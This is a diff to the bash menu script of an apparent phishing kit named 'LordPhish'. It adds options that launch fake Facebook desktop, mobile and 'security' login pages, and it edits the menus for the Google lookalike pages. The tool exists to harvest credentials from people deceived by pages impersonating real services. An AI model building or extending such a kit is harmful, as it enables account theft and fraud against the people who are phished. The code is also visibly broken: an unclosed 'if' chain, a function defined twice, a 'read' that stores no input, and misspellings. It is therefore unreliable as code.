@@ -74,7 +74,8 @@ start
 
 elif [[ $option == 2 ]]; then
 server="facebook"
-start
+listfb
+
 elif [[ $option == 3 ]]; then
 server="snapchat"
 start
@@ -320,13 +321,73 @@ printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illeg
 printf "\n"
 }
 
+listfb() {
+    clear
+    banner
+    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook desktop\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook mobile\e[0m\n"
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
+if [[ $option == 1 ]]; then
+lfbdesk
+
+if [[ $option == 2 ]]; then
+lfbmob
+
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+menu
+fi
+}
+
+lfbdesk() {
+ clear
+ banner
+ printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook page\e[0m\n"
+ printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Statisc\e[0m\n"
+ read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en'
+ 
+if [[ $option == 1 ]]; then
+server="face_desk"
+start
+    
+elif [[ $option == 2 ]]; then
+server="face_deskStat"
+start
+ 
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+menu
+fi
+}
+
+lfbdesk() {
+ clear
+ banner
+ printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Page\e[0m\n"
+ printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Security Page\e[0m\n"
+ read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en'
+ 
+if [[ $option == 1 ]]; then
+server="face_moobileP"
+start
+    
+elif [[ $option == 2 ]]; then
+server="face_mobSec"
+start
+ 
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+menu
+fi
+}
+
 list_g() {
     clear
     banner
-    
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google to pc\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile\e[0m\n"
-    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' oofic
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
+    
 if [[ $option == 1 ]]; then
 server="Google_pc"
 start
@@ -346,7 +407,7 @@ clear
     
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile2\e[0m\n"
-    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' oofic
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
 if [[ $option == 1 ]]; then
 server="Google_mobile"
 start
